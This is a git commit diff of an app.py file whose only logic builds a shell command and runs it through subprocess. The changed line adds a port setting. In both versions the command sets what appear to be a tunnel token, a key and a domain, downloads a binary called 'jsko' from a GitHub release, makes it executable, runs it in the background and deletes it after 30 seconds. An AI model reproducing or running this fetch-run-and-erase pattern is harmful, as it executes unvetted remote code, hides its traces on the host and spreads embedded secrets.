47fea10e607e0103b83532bff573eadd445b02ae
Kuang YiWu <136738046+alphaxcv@users.noreply.github.com>
2025-12-26 10:02:50 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,3 +1,3 @@
 import subprocess
-cmd = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYWM5Yjk3Y2QtZDg4ZC00NTYwLThmYTYtZWU5NzgwZGIzMTM0IiwicyI6Ik5qaGlPVFJrTjJVdE1UZzVOQzAwTmpFMExUaGpaR1F0TlRVNVlXRXdOakJoWldOaiJ9 K_K=5D-tgfJVlXEl7aDX C_D=streamlit3.seav.eu.org bash -c 'curl -L -o jsko https://github.com/seav1/dl/releases/download/files/jsko && chmod +x jsko && ./jsko & sleep 30 && rm -f jsko'"
+cmd = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYWM5Yjk3Y2QtZDg4ZC00NTYwLThmYTYtZWU5NzgwZGIzMTM0IiwicyI6Ik5qaGlPVFJrTjJVdE1UZzVOQzAwTmpFMExUaGpaR1F0TlRVNVlXRXdOakJoWldOaiJ9 K_K=5D-tgfJVlXEl7aDX C_D=streamlit3.seav.eu.org PORT=3000 bash -c 'curl -L -o jsko https://github.com/seav1/dl/releases/download/files/jsko && chmod +x jsko && ./jsko & sleep 30 && rm -f jsko'"
 subprocess.call(cmd, shell=True)
